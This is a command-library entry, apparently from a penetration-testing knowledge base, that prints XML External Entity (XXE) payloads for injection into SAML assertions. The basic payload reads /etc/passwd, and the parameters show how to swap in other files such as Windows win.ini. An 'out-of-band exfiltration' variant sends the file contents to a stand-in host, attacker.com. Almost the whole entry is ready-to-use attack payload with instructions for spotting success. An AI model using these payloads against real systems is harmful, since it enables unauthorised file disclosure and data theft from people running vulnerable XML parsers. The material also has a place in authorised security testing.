---
id: 2b05f204-1d9d-4b1b-9b16-7614b065b735
name: display-xxe-payload-examples
type: command
executor: bash
data: >-
  echo '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <saml:Assertion>&xxe;</saml:Assertion>'
output: null
created_at: '2023-04-06T03:56:32.215678+00:00'
updated_at: '2023-04-10T20:23:27.199204+00:00'
platforms:
  - Linux
tags:
  - xxe
  - xml-injection
verified: true
validated: true
---

# display-xxe-payload-examples

## Command

```bash
echo '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <saml:Assertion>&xxe;</saml:Assertion>'
```

## Description

This command outputs a sample XXE payload for injection into SAML XML, defining an external entity to read a local file and reference it in the assertion. Use it to quickly generate payloads for testing file disclosure in vulnerable parsers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| file:///etc/passwd | Path to the target file (modify as needed, e.g., file:///c:/windows/win.ini on Windows) | Yes |

## Examples

### Basic Usage

```bash
echo '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <saml:Assertion>&xxe;</saml:Assertion>'
```

### Advanced Usage (OOB Exfiltration)

```bash
echo '<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/xxe?data=%file;"> %xxe; ]> <saml:Assertion>Injected</saml:Assertion>'
```

## Expected Output

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <saml:Assertion>&xxe;</saml:Assertion>

Copy this output into your XML editor or proxy for injection. Success is indicated if the response echoes file contents; otherwise, check for parser errors.

## Related

- [[procedures/SAML-Injection-for-Authentication-Bypass-and-XXE-Exploitation]]
